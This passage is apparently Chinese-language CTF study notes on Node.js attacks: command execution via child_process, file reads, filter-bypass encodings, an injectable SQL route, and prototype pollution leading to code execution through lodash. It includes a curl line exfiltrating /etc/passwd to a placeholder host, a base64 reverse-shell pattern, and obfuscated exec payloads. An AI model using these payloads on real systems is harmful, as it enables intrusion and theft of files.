  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;应用实例，访问地址为 http://127.0.0.1:1234/&quot;</span>); 
&#125;)</code></pre>

<h2 id="child-process模块中的命令执行"><a href="#child-process模块中的命令执行" class="headerlink" title="child_process模块中的命令执行"></a>child_process模块中的命令执行</h2><p>首先我们来了解一下什么是child_process模块<br>child_process模块提供了与popen(3)类似但不完全相同的方式衍生子进程的能力。该库通过创建管道、分叉和调用外壳来打开一个进程。<br>child_process提供了几种创建子进程的方式</p>
<ul>
<li>异步方式：spawn、exec、execFile、fork</li>
<li>同步方式：spawnSync、execSync、execFileSync</li>
</ul>
<h3 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h3><p>Node.js中的chile_process.exec调用的是&#x2F;bash.sh，它是一个bash解释器，可以执行系统命令</p>
<pre><code class="highlight javascript"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;calc&#x27;</span>); <span class="comment">//弹出计算器 </span></code></pre>

<ul>
<li>linux中的文件读取</li>
</ul>
<pre><code class="highlight javascript"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;curl -F &quot;x=`cat /etc/passwd`&quot; http://vps&#x27;</span>);</code></pre>

<ul>
<li>反弹shell</li>
</ul>
<pre><code class="highlight javascript"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;echo SHELL_BASE_64|base64 -d|bash&#x27;</span>);</code></pre>

<h3 id="execSync"><a href="#execSync" class="headerlink" title="execSync"></a>execSync</h3><p><a target="_blank" rel="noopener" href="https://nodejs.cn/api/child_process/child_process_execsync_command_options.html">child_process.execSync(command[, options]) | Node.js API 文档</a></p>
<pre><code class="highlight javascript"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&quot;ls&quot;</span>);</code></pre>

<h3 id="execFile"><a href="#execFile" class="headerlink" title="execFile"></a>execFile</h3><p>启动一个子进程来执行可执行文件。实际利用时，在第一个参数位置执行 shell 命令，类似 exec。</p>
<pre><code class="highlight javascript"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execFile</span>(<span class="string">&quot;calc&quot;</span>,&#123;<span class="attr">shell</span>:<span class="literal">true</span>&#125;);</code></pre>

<h3 id="fork"><a href="#fork" class="headerlink" title="fork"></a>fork</h3><p>与spawn()类似，不同点在于它创建Node的子进程只需指定要执行的JavaScript文件模块即可。用于执行 js 文件，实际利用中需要提前写入恶意文件</p>
<pre><code class="highlight javascript"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">fork</span>(<span class="string">&quot;./hacker.js&quot;</span>);</code></pre>

<h3 id="spawn"><a href="#spawn" class="headerlink" title="spawn"></a>spawn</h3><pre><code class="highlight javascript"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">spawn</span>(<span class="string">&quot;calc&quot;</span>,&#123;<span class="attr">shell</span>:<span class="literal">true</span>&#125;);</code></pre>

<blockquote>
<p>PS：如果上下文中没有require(类似于Code-Breaking 2018 Thejs)，则可以使用**global.process.mainModule.constructor._load(‘child_process’).exec(‘calc’)**来执行命令</p>
</blockquote>
<h1 id="NodeJS中的文件操作"><a href="#NodeJS中的文件操作" class="headerlink" title="NodeJS中的文件操作"></a>NodeJS中的文件操作</h1><p>那么在上面 我们已经可以执行我们像执行的代码 了 那么对于文件的操作也是很好实现的<br>操作函数后面有Sync 代表同步方法<br>nodejs文件系统模块中的方法均有异步和同步版本 比如读取文件内容的函数有 异步的 fs.readFile() 和 同步的 fs.readFileSync()。<br>异步的方法函数 最后一个 参数为 回调函数 回调函数的 第一个参数 包含了错误信息<br>建议使用异步方法 性能更高 速度更快<br>增删查改</p>
<pre><code class="highlight javascript">res.<span class="title function_">end</span>(<span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">readdirSync</span>(<span class="string">&#x27;.&#x27;</span>).<span class="title function_">toString</span>()) 	<span class="comment">//读取当前目录下内容，&quot;.&quot;为你的目录</span>
res.<span class="title function_">end</span>(<span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">writeFileSync</span>(<span class="string">&#x27;./daigua.txt&#x27;</span>,<span class="string">&#x27;内容&#x27;</span>).<span class="title function_">toString</span>()); 	<span class="comment">//写文件</span>
res.<span class="title function_">end</span>(<span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">readFileSync</span>(<span class="string">&#x27;./daigua.txt&#x27;</span>).<span class="title function_">toString</span>()); 	<span class="comment">//读文件</span>
res.<span class="title function_">end</span>(<span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">rmdirSync</span>(<span class="string">&#x27;./daigua&#x27;</span>).<span class="title function_">toString</span>());	<span class="comment">//删除文件</span></code></pre>

<p>在2023网信柏鹭杯出现过一道类似的题，使用 fs.readFileSync 进行文件读取<br>要满足 fs.readFileSync 的数组格式读取需要满足以下条件</p>
<ul>
<li>有 href 且非空</li>
<li>有 origin 且非空</li>
<li>protocol 等于 file:</li>
<li>有 hostname 且等于空(Windwos下非空的话会进行远程加载)</li>
<li>有 pathname 且非空(读取的文件路径)</li>
</ul>
<p>payload</p>
<pre><code class="highlight javascript">?file[href]=a&amp;file[origin]=<span class="number">1</span>&amp;file[protocol]=<span class="attr">file</span>:&amp;file[hostname]=&amp;file[pathname]=读取的文件</code></pre>

<h1 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h1><h2 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h2><p>通过我们上面对于nodejs命令执行的学习，我们知道在NodeJs中调用模块是通过“.”来实现的，假如说我们过滤了.，我们可以通过 [] 实现对于模块的调用</p>
<pre><code class="highlight javascript"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>)[<span class="string">&quot;exec&quot;</span>](<span class="string">&#x27;calc&#x27;</span>); <span class="comment">//require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;); </span></code></pre>

<h2 id="拼接绕过"><a href="#拼接绕过" class="headerlink" title="拼接绕过"></a>拼接绕过</h2><p>对于过滤一些关键字，我们可以使用拼接的方法进行绕过</p>
<pre><code class="highlight javascript"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>)[<span class="string">&quot;ex&quot;</span>+<span class="string">&quot;ec&quot;</span>](<span class="string">&#x27;calc&#x27;</span>); <span class="comment">//require(&#x27;child_process&#x27;)[&quot;exec&quot;](&#x27;calc&#x27;); </span></code></pre>

<h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><ol>
<li>十六进制编码绕过</li>
</ol>
<p>JavaScript是支持16进制作为字符串使用的，我们可以使用十六进制进行绕过</p>
<pre><code class="highlight javascript"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>)[<span class="string">&quot;\x65\x78\x65\x63&quot;</span>](<span class="string">&#x27;calc&#x27;</span>); <span class="comment">//require(&#x27;child_process&#x27;)[&quot;exec&quot;](&#x27;calc&#x27;); </span></code></pre>

<ol start="2">
<li>unicode编码绕过</li>
</ol>
<p>JavaScript除了支持十六进制以外还支持Unicode编码作为字符串使用</p>
<pre><code class="highlight javascript"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>)[<span class="string">&quot;\u0065\u0078\u0065\u0063&quot;</span>](<span class="string">&#x27;calc&#x27;</span>); <span class="comment">//require(&#x27;child_process&#x27;)[&quot;exec&quot;](&#x27;calc&#x27;); </span></code></pre>

<ol start="3">
<li>base64编码绕过</li>
</ol>
<pre><code class="highlight javascript"><span class="built_in">eval</span>(<span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&#x27;cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpWyJleGVjIl0oJ2NhbGMnKTs=&#x27;</span>,<span class="string">&#x27;base64&#x27;</span>).<span class="title function_">toString</span>()); <span class="comment">//require(&#x27;child_process&#x27;)[&quot;exec&quot;](&#x27;calc&#x27;); </span></code></pre>

<h2 id="ES6模绕过"><a href="#ES6模绕过" class="headerlink" title="ES6模绕过"></a>ES6模绕过</h2><p>我们也可以使用ES6模板绕过，反引号后面加入模板</p>
<pre><code class="highlight javascript"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>)[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`exe`</span>&#125;</span>cSync`</span>&#125;</span>`</span><span class="string">&quot;](&#x27;calc&#x27;); </span></code></pre>

<h2 id="concat拼接绕过"><a href="#concat拼接绕过" class="headerlink" title="concat拼接绕过"></a>concat拼接绕过</h2><pre><code class="highlight javascript"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>)[<span class="string">&quot;exe&quot;</span>.<span class="title function_">concat</span>(<span class="string">&quot;c&quot;</span>)](<span class="string">&#x27;calc&#x27;</span>);</code></pre>

<h2 id="Obejct-values"><a href="#Obejct-values" class="headerlink" title="Obejct.values"></a>Obejct.values</h2><p>Object.values(obj)返回一个数组，成员是参数对象自身的（不含继承的）所有可遍历属性的键值，有点类似JAVA中的反射例如我们获取child_process库的所有对象，我们可以根据我们自己的需要来获取对象。</p>
<pre><code class="highlight javascript">&gt; <span class="keyword">var</span> x = <span class="title class_">Object</span>.<span class="title function_">values</span>(<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>));
<span class="literal">undefined</span>
&gt; <span class="variable language_">console</span>.<span class="title function_">log</span>(x)
[
  [<span class="title class_">Function</span>: _forkChild],
  [<span class="title class_">Function</span>: <span class="title class_">ChildProcess</span>],
  [<span class="title class_">Function</span>: exec],
  [<span class="title class_">Function</span>: execFile],
  [<span class="title class_">Function</span>: execFileSync],
  [<span class="title class_">Function</span>: execSync],
  [<span class="title class_">Function</span>: fork],
  [<span class="title class_">Function</span>: spawn],
  [<span class="title class_">Function</span>: spawnSync]
]
<span class="literal">undefined</span>
&gt; <span class="keyword">var</span> x = <span class="title class_">Object</span>.<span class="title function_">values</span>(<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>))[<span class="number">4</span>](<span class="string">&#x27;whoami&#x27;</span>);
<span class="literal">undefined</span>
&gt; <span class="variable language_">console</span>.<span class="title function_">log</span>(x)
&lt;<span class="title class_">Buffer</span> 6c <span class="number">61</span> <span class="number">70</span> <span class="number">74</span> 6f <span class="number">70</span> 2d <span class="number">68</span> <span class="number">76</span> <span class="number">35</span> 6f <span class="number">69</span> <span class="number">36</span> <span class="number">74</span> <span class="number">67</span> 5c <span class="number">68</span> <span class="number">65</span> <span class="number">68</span> <span class="number">61</span> 6e <span class="number">73</span> <span class="number">65</span> 6e 0d 0a&gt;</code></pre>

<p><img src="http://oss.hehanzzz.icu/img/202405061254232.png"><br>Buffer经过16进制转文字后是 laptop-hv5oi6tg\hehansen<br><img src="http://oss.hehanzzz.icu/img/202405061254572.png"><br>同样可以执行calc<br><img src="http://oss.hehanzzz.icu/img/202405061254943.png"></p>
<h1 id="SQLI注入（待实践）"><a href="#SQLI注入（待实践）" class="headerlink" title="SQLI注入（待实践）"></a>SQLI注入（待实践）</h1><p>node.js 的 sql 注入和 php 这些都差不多，都是缺少对特殊字符的验证，用户可控输入和原本执行的代码。</p>
<pre><code class="highlight javascript"><span class="keyword">var</span> mysql = <span class="built_in">require</span>(<span class="string">&#x27;mysql&#x27;</span>);
<span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);
<span class="keyword">const</span> app = <span class="title function_">express</span>();

<span class="keyword">var</span> db = mysql.<span class="title function_">createConnection</span>(&#123;
  host     :<span class="string">&#x27;localhost&#x27;</span>,
  user     :<span class="string">&#x27;root&#x27;</span>,
  password :<span class="string">&#x27;root&#x27;</span>,
  database :<span class="string">&#x27;test&#x27;</span>
&#125;);

db.<span class="title function_">connect</span>();

app.<span class="title function_">get</span>(<span class="string">&#x27;/hello/:id&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;
  <span class="keyword">let</span> sql=<span class="string">`select * from user where id= <span class="subst">$&#123;req.params.id&#125;</span>`</span>;
  db.<span class="title function_">query</span>(sql,<span class="function">(<span class="params">err,result</span>)=&gt;</span>&#123;
    <span class="keyword">if</span>(err)&#123;
      <span class="variable language_">console</span>.<span class="title function_">log</span>(err);
      res.<span class="title function_">send</span>(err)
    &#125;<span class="keyword">else</span>&#123;
      <span class="variable language_">console</span>.<span class="title function_">log</span>(result);
      res.<span class="title function_">send</span>(result)
    &#125;
  &#125;)
&#125;);</code></pre>

<h1 id="原型链污染原理"><a href="#原型链污染原理" class="headerlink" title="原型链污染原理"></a>原型链污染原理</h1><p>以下为p神文章，这里为了方便直接复制过来：<br><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">深入理解 JavaScript Prototype 污染攻击</a></p>
<h2 id="0x01-prototype和-proto-分别是什么？"><a href="#0x01-prototype和-proto-分别是什么？" class="headerlink" title="0x01 prototype和__proto__分别是什么？"></a>0x01 prototype和__proto__分别是什么？</h2><p>JavaScript中，我们如果要定义一个类，需要以定义“构造函数”的方式来定义：</p>
<pre><code class="highlight javascript"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>) &#123;     
  <span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span> 
&#125; 
<span class="keyword">new</span> <span class="title class_">Foo</span>()</code></pre>

<p>Foo函数的内容，就是Foo类的构造函数，而this.bar就是Foo类的一个属性。</p>
<blockquote>
<p>为了简化编写JavaScript代码，ECMAScript 6后增加了class语法，但class其实只是一个语法糖。<br>语法糖（Syntactic sugar），也译为糖衣语法，是由英国计算机科学家彼得·约翰· 兰达 （Peter J. Landin）发明的一个术语，指 计算机语言 中添加的某种语法，这种语法对语言的功能并没有影响，但是更方便 程序员 使用。 通常来说使用语法糖能够增加程序的可读性，从而减少程序代码出错的机会。</p>
</blockquote>
<p>一个类必然有一些方法，类似属性this.bar，我们也可以将方法定义在构造函数内部：</p>
<pre><code class="highlight javascript"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>) &#123;     
  <span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span>     
    <span class="variable language_">this</span>.<span class="property">show</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;         
      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">bar</span>)     
    &#125; 
&#125; 
(<span class="keyword">new</span> <span class="title class_">Foo</span>()).<span class="title function_">show</span>()</code></pre>

<p>但这样写有一个问题，就是每当我们新建一个Foo对象时， this.show &#x3D; function… 就会执行一次，这个show方法实际上是绑定在对象上的，而不是绑定在“类”中。<br>我希望在创建类的时候只创建一次show方法，这时候就则需要使用原型（prototype）了：</p>
<pre><code class="highlight javascript"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>) &#123;     
  <span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span> 
&#125; 

<span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">show</span> = <span class="keyword">function</span> <span class="title function_">show</span>(<span class="params"></span>) &#123;     
  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">bar</span>) 
&#125; 

<span class="keyword">let</span> foo = <span class="keyword">new</span> <span class="title class_">Foo</span>() 
foo.<span class="title function_">show</span>()</code></pre>

<p>我们可以认为原型 prototype 是类 Foo 的一个属性，而所有用 Foo 类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。比如上图中的 foo 对象，其天生就具有 foo.show() 方法。<br>我们可以通过 Foo.prototype 来访问 Foo 类的原型，但 Foo 实例化出来的对象，是不能通过 prototype 访问原型的。这时候，就该 <strong>proto</strong> 登场了。</p>
<p>一个 Foo 类实例化出来的 foo 对象，可以通过 foo.<strong>proto</strong> 属性来访问 Foo 类的原型，也就是说：</p>
<pre><code class="highlight javascript">foo.<span class="property">__proto__</span> == <span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span></code></pre>

<p>所以，总结一下：</p>
<ol>
<li>prototype是一个类的属性，所有类对象在实例化的时候将会拥有prototype中的属性和方法</li>
<li>一个对象的__proto__属性，指向这个对象所在的类的prototype属性</li>
</ol>
<h2 id="0x02-JavaScript原型链继承"><a href="#0x02-JavaScript原型链继承" class="headerlink" title="0x02 JavaScript原型链继承"></a>0x02 JavaScript原型链继承</h2><p>所有类对象在实例化的时候将会拥有prototype中的属性和方法，这个特性被用来实现JavaScript中的继承机制。<br>比如：</p>
<pre><code class="highlight javascript"><span class="keyword">function</span> <span class="title function_">Father</span>(<span class="params"></span>) &#123;     
  <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">&#x27;Donald&#x27;</span>     
    <span class="variable language_">this</span>.<span class="property">last_name</span> = <span class="string">&#x27;Trump&#x27;</span> 
&#125; 

<span class="keyword">function</span> <span class="title function_">Son</span>(<span class="params"></span>) &#123;     
  <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">&#x27;Melania&#x27;</span> 
&#125; 

<span class="title class_">Son</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Father</span>() 
  
<span class="keyword">let</span> son = <span class="keyword">new</span> <span class="title class_">Son</span>() 
<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Name: <span class="subst">$&#123;son.first_name&#125;</span> <span class="subst">$&#123;son.last_name&#125;</span>`</span>)</code></pre>

<p>Son类继承了Father类的 last_name 属性，最后输出的是 Name: Melania Trump。</p>
<p>总结一下，对于对象son，在调用 son.last_name 的时候，实际上JavaScript引擎会进行如下操作：</p>
<ol>
<li>在对象son中寻找 last_name</li>
<li>如果找不到，则在 son.<strong>proto</strong> 中寻找last_name</li>
<li>如果仍然找不到，则继续在 son.<strong>proto</strong>.<strong>proto</strong> 中寻找 last_name</li>
<li>依次寻找，直到找到null结束。比如，Object.prototype的__proto__ 就是null</li>
</ol>
<p>JavaScript的这个查找的机制，被运用在面向对象的继承中，被称作 prototype 继承链。<br>以上就是最基础的JavaScript面向对象编程，我们并不深入研究更细节的内容，只要牢记以下几点即可：</p>
<ol>
<li>每个构造函数 (constructor) 都有一个原型对象 (prototype)</li>
<li>对象的 <strong>proto</strong> 属性，指向类的原型对象 prototype</li>
<li>JavaScript使用 prototype 链实现继承机制</li>
</ol>
<p><img src="http://oss.hehanzzz.icu/img/202405061254889.png"></p>
<h2 id="0x03-原型链污染是什么"><a href="#0x03-原型链污染是什么" class="headerlink" title="0x03 原型链污染是什么"></a>0x03 原型链污染是什么</h2><p>第一章中说到，foo.<strong>proto</strong> 指向的是Foo类的 prototype 。那么，如果我们修改了 foo.<strong>proto</strong> 中的值，是不是就可以修改Foo类呢？<br>做个简单的实验：</p>
<pre><code class="highlight javascript"><span class="comment">// foo是一个简单的JavaScript对象 </span>
<span class="keyword">let</span> foo = &#123;<span class="attr">bar</span>: <span class="number">1</span>&#125; 

<span class="comment">// foo.bar 此时为1 </span>
<span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>) 

<span class="comment">// 修改foo的原型（即Object） </span>
foo.<span class="property">__proto__</span>.<span class="property">bar</span> = <span class="number">2</span> 

<span class="comment">// 由于查找顺序的原因，foo.bar仍然是1 </span>
<span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>) 

<span class="comment">// 此时再用Object创建一个空的zoo对象 </span>
<span class="keyword">let</span> zoo = &#123;&#125; 

<span class="comment">// 查看zoo.bar </span>
<span class="variable language_">console</span>.<span class="title function_">log</span>(zoo.<span class="property">bar</span>)</code></pre>

<p>最后，虽然zoo是一个空对象 {} ，但 zoo.bar 的结果居然是2：<br>原因也显而易见：因为前面我们修改了foo的原型 foo.<strong>proto</strong>.bar &#x3D; 2，而 foo 是一个 Object 类的实例，所以实际上是修改了 Object 这个类，给这个类增加了一个属性 bar ，值为2。<br>后来，我们又用 Object 类创建了一个 zoo 对象 let zoo &#x3D; {} ，zoo 对象自然也有一个 bar 属性了。<br>那么，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是<strong>原型链污染</strong>。</p>
<h2 id="0x04-哪些情况下原型链会被污染？"><a href="#0x04-哪些情况下原型链会被污染？" class="headerlink" title="0x04 哪些情况下原型链会被污染？"></a>0x04 哪些情况下原型链会被污染？</h2><p>在实际应用中，哪些情况下可能存在原型链能被攻击者修改的情况呢？<br>我们思考一下，哪些情况下我们可以设置__proto__的值呢？其实找找能够控制数组（对象）的“键名”的操作即可：</p>
<ul>
<li>对象merge</li>
<li>对象clone（其实内核就是将待操作的对象 merge 到一个空对象中）</li>
</ul>
<p>以对象merge为例，我们想象一个简单的merge函数：</p>
<pre><code class="highlight javascript"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;     
  <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;         
    <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;             
      <span class="title function_">merge</span>(target[key], source[key])         
    &#125; <span class="keyword">else</span> &#123;             
      target[key] = source[key]         
    &#125;     
  &#125; 
&#125;</code></pre>

<p>在合并的过程中，存在赋值的操作 target[key] &#x3D; source[key] ，那么，这个key如果是 <strong>proto</strong> ，是不是就可以原型链污染呢？<br>我们用如下代码实验一下：</p>
<pre><code class="highlight javascript"><span class="keyword">let</span> o1 = &#123;&#125; 
<span class="keyword">let</span> o2 = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="string">&quot;__proto__&quot;</span>: &#123;<span class="attr">b</span>: <span class="number">2</span>&#125;&#125; 
<span class="title function_">merge</span>(o1, o2) 
<span class="variable language_">console</span>.<span class="title function_">log</span>(o1.<span class="property">a</span>, o1.<span class="property">b</span>) 
  
o3 = &#123;&#125; 
<span class="variable language_">console</span>.<span class="title function_">log</span>(o3.<span class="property">b</span>)</code></pre>

<p>结果是，合并虽然成功了，但原型链没有被污染：<br><a target="_blank" rel="noopener" href="https://www.leavesongs.com/media/attachment/2019/04/03/ba16d965-3112-4f69-bf5e-4eddb034e6dc.png"><img src="http://oss.hehanzzz.icu/img/202405061254238.png"></a><br>这是因为，我们用JavaScript创建o2的过程（let o2 &#x3D; {a: 1, “<strong>proto</strong>“: {b: 2}}）中，<strong>proto</strong> 已经代表 o2 的原型了，此时遍历 o2 的所有键名，你拿到的是 [a, b]，<strong>proto</strong> 并不是一个key，自然也不会修改 Object 的原型。<br>那么，如何让 <strong>proto</strong> 被认为是一个键名呢？<br>我们将代码改成如下：</p>
<pre><code class="highlight javascript"><span class="keyword">let</span> o1 = &#123;&#125; 
<span class="keyword">let</span> o2 = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>) 
<span class="title function_">merge</span>(o1, o2) 
<span class="variable language_">console</span>.<span class="title function_">log</span>(o1.<span class="property">a</span>, o1.<span class="property">b</span>) 
  
o3 = &#123;&#125; 
<span class="variable language_">console</span>.<span class="title function_">log</span>(o3.<span class="property">b</span>)</code></pre>

<p>可见，新建的o3对象，也存在b属性，说明Object已经被污染：<br><img src="http://oss.hehanzzz.icu/img/202405061254750.png"><br>这是因为，JSON解析的情况下，<strong>proto</strong> 会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历 o2 的时候会存在这个键。<br>merge 操作是最常见可能控制键名的操作，也最能被原型链攻击，很多常见的库都存在这个问题。</p>
<h2 id="0x05-Code-Breaking-2018-Thejs-分析"><a href="#0x05-Code-Breaking-2018-Thejs-分析" class="headerlink" title="0x05 Code-Breaking 2018 Thejs 分析"></a>0x05 Code-Breaking 2018 Thejs 分析</h2><p>我在Code-Breaking 2018中出了一道原型链污染的CTF题目，为了更加贴合真实环境，我没有刻意加太多自己的代码，后端主要代码如下（完整代码可参考<a target="_blank" rel="noopener" href="https://github.com/phith0n/code-breaking/blob/master/2018/thejs/web/server.js">这里</a>）：</p>
<pre><code class="highlight javascript"><span class="comment">// ... </span>
<span class="keyword">const</span> lodash = <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>) 
<span class="comment">// ... </span>

app.<span class="title function_">engine</span>(<span class="string">&#x27;ejs&#x27;</span>, <span class="keyword">function</span> (<span class="params">filePath, options, callback</span>) &#123;  
<span class="comment">// define the template engine    </span>
  fs.<span class="title function_">readFile</span>(filePath, <span class="function">(<span class="params">err, content</span>) =&gt;</span> &#123;         
    <span class="keyword">if</span> (err) <span class="keyword">return</span> <span class="title function_">callback</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(err))        
    <span class="keyword">let</span> compiled = lodash.<span class="title function_">template</span>(content)         
    <span class="keyword">let</span> rendered = <span class="title function_">compiled</span>(&#123;...options&#125;)         
      
    <span class="keyword">return</span> <span class="title function_">callback</span>(<span class="literal">null</span>, rendered)     
  &#125;) 
&#125;) 
<span class="comment">//... </span>

app.<span class="title function_">all</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;     
  <span class="keyword">let</span> data = req.<span class="property">session</span>.<span class="property">data</span> || &#123;<span class="attr">language</span>: [], <span class="attr">category</span>: []&#125;     
    <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&#x27;POST&#x27;</span>) &#123;         
      data = lodash.<span class="title function_">merge</span>(data, req.<span class="property">body</span>)         
      req.<span class="property">session</span>.<span class="property">data</span> = data     
    &#125;     
  
  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123;         
    <span class="attr">language</span>: data.<span class="property">language</span>,          
    <span class="attr">category</span>: data.<span class="property">category</span>     
  &#125;) 
&#125;)</code></pre>

<p>lodash 是为了弥补 JavaScript 原生函数功能不足而提供的一个辅助功能集，其中包含字符串、数组、对象等操作。这个Web应用中，使用了 lodash 提供的两个工具：</p>
<ol>
<li>lodash.template 一个简单的模板引擎</li>
<li>lodash.merge 函数或对象的合并</li>
</ol>
<p>其实整个应用逻辑很简单，用户提交的信息，用 merge 方法合并到 session 里，多次提交，session 里最终保存你提交的所有信息。<br>而这里的 lodash.merge 操作实际上就存在原型链污染漏洞。<br>在污染原型链后，我们相当于可以给Object对象插入任意属性，这个插入的属性反应在最后的 lodash.template 中。我们看到 lodash.template 的代码：<br><a target="_blank" rel="noopener" href="https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165">https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165</a></p>
<pre><code class="highlight javascript"><span class="comment">// Use a sourceURL for easier debugging. </span>
<span class="keyword">var</span> sourceURL = <span class="string">&#x27;sourceURL&#x27;</span> <span class="keyword">in</span> options ? <span class="string">&#x27;//# sourceURL=&#x27;</span> + options.<span class="property">sourceURL</span> + <span class="string">&#x27;\n&#x27;</span> : <span class="string">&#x27;&#x27;</span>; 
<span class="comment">// ... </span>
<span class="keyword">var</span> result = <span class="title function_">attempt</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;  
  <span class="keyword">return</span> <span class="title class_">Function</span>(importsKeys, sourceURL + <span class="string">&#x27;return &#x27;</span> + source).<span class="title function_">apply</span>(<span class="literal">undefined</span>, importsValues); 
&#125;);</code></pre>

<p>options 是一个对象，sourceURL 取到了其 options.sourceURL 属性。这个属性原本是没有赋值的，默认取空字符串。<br>但因为原型链污染，我们可以给所有Object对象中都插入一个sourceURL属性。最后，这个 sourceURL 被拼接进 new Function 的第二个参数中，造成任意代码执行漏洞。<br>我将带有__proto__ 的 Payload 以 json 的形式发送给后端，因为 express 框架支持根据 Content-Type 来解析请求 Body，这里给我们注入原型提供了很大方便：<br><a target="_blank" rel="noopener" href="https://www.leavesongs.com/media/attachment/2019/04/03/85fae11e-100b-41aa-9316-de81b93d0036.png"><img src="http://oss.hehanzzz.icu/img/202405061254497.png"></a><br>可见，我们代码执行成功，返回了id命令的结果。<br>整个案例我觉得是一个非常经典的原型链污染漏洞教程，代码不多，逻辑不复杂，没有刻意创造漏洞，真正触发漏洞的代码在库中。<br>我一直觉得，出题不要刻意创造漏洞，而是找找你的知识点是否能在真实环境下找到应用。</p>
<h2 id="相关文章"><a href="#相关文章" class="headerlink" title="相关文章"></a>相关文章</h2><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf">prototype-pollution-nsec18&#x2F;paper&#x2F;JavaScript_prototype_pollution_attack_in_NodeJS.pdf at master · HoLyVieR&#x2F;prototype-pollution-nsec18</a></li>
<li><a target="_blank" rel="noopener" href="https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/">Express+lodash+ejs: 从原型链污染到RCE</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2802">从一道 CTF 题看 Node.js 的 prototype pollution attack - 先知社区</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2735">JavaScript原型链污染 - 先知社区</a></li>
